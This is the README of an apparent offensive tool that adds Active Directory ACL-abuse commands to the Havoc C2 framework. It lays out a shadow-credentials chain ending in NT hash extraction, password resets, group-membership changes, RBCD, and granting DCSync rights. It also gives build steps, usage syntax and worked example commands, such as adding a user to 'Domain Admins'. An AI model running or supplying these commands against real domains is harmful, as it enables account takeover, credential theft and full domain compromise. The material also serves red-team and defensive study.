# acl-abuse-havoc

AD ACL abuse for Havoc C2.


## What's inside

| Command | Right Abused | Transport | Notes |
|---|---|---|---|
| `acl-shadow` | GenericWrite / GenericAll | LDAP + Kerberos/88 | Full inline attack chain — see below |
| `acl-fcp` | ForceChangePassword | LDAPS | |
| `acl-addmember` | WriteMembers / GenericAll | LDAP | |
| `acl-owner` | WriteOwner | LDAPS | |
| `acl-rbcd` | GenericWrite on computer | LDAP | |
| `acl-dcsync` | WriteDACL on domain | LDAP | Expects full DN |
| `acl-genericall` | WriteDACL | LDAP | |
| `acl-ace` | Custom ACE | LDAP | Generic — specify access mask, type, flags and optional GUIDs |



## acl-shadow

Full inline Shadow Credentials attack chain.

```
1.  LDAP lookup         resolve target DN + objectSid
2.  RSA keypair         2048-bit, generated in-process
3.  Certificate         self-signed, UPN SAN + SID URL (KB5014754)
4.  KeyCredential       build msDS-KeyCredentialLink blob (MS-ADTS §2.2.20)
5.  LDAP write          add KeyCredential to target object
6.  PKINIT AS-REQ       PA-PK-AS-REQ, DH key exchange (MODP Group 2)
7.  AS-REP              derive reply key via kTruncate (RFC 4556 §3.2.3.1)
8.  U2U TGS-REQ         service ticket encrypted with session key
9.  PAC decrypt         PAC_CREDENTIAL_INFO -> NT hash
10. Cleanup             remove KeyCredential from msDS-KeyCredentialLink
```

**Encryption types:** AES256-CTS-HMAC-SHA1-96, AES128-CTS-HMAC-SHA1-96, RC4-HMAC. The KDC negotiates from this list, environments that reject AES256-only are handled automatically.

**Requirements:**
- Windows Server 2016+ DC
- AD CS installed with the `Kerberos Authentication` certificate template
- Target account must have GenericWrite or GenericAll

**Output:**
```
[+] KeyCredential written (DeviceId: ...)
[+] pfx (base64, no password): ...
[+] pkinit :: TGT obtained
[+] tgt (kirbi b64): ...
[+] NT Hash: aabbccdd11223344aabbccdd11223344
[+] keycred :: removed from msDS-KeyCredentialLink
```



## Setup

```bash
git clone https://github.com/0xM4L/acl-abuse-havoc
cd acl-abuse-havoc
make
```

Load `acl-abuse.py` via Script Manager in the Havoc client.

**Dependencies:** `mingw-w64`, x64 only.



## Usage

```
acl-shadow <target> <domain> [dc]
acl-fcp <target> <newpassword>
acl-addmember <group> <user> <domain>
acl-owner <target> <newowner> <domain>
acl-rbcd <computer> <principal> <domain>
acl-dcsync "DC=domain,DC=local" <user> [dc]
acl-genericall <target> <user> <domain>
acl-ace <target> <trustee> <access_mask> [ace_type] [ace_flags] [object_guid] [inherited_guid] [dc]
```

All commands accept an optional `[dc]` as the last argument. Omit it and the DC is auto-discovered via `DsGetDcNameW`.

**Examples:**
```
acl-shadow jsmith vuln.local
acl-shadow jsmith vuln.local dc01.vuln.local
acl-fcp jsmith Password123!
acl-addmember "Domain Admins" jsmith vuln.local
acl-owner jsmith attacker vuln.local
acl-rbcd WS01$ attacker$ vuln.local
acl-dcsync "DC=vuln,DC=local" jsmith
acl-genericall jsmith attacker vuln.local
acl-ace jsmith attacker GenericAll
```



## Notes

- acl-fcp and acl-owner need LDAPS (port 636).
- acl-dcsync takes the full domain DN, DC=domain,DC=local. Drops DS-Replication-Get-Changes and DS-Replication-Get-Changes-All in one shot.
- acl-shadow writes and cleans up the KeyCredential in the same run. Window is under 5 seconds.
- Everything runs as the current beacon user via Negotiate.
- DC is auto-discovered. Pass it explicitly if the network is segmented.

## DEMO


## Credits

Shadow Credentials BOF based on [RayRRT/BOFs](https://github.com/RayRRT/BOFs), integration, debugging, and Havoc wrapper by [0xM4L](https://github.com/0xM4L).  
LDAP BOF reference implementations, [P0142/LDAP-Bof-Collection](https://github.com/P0142/LDAP-Bof-Collection).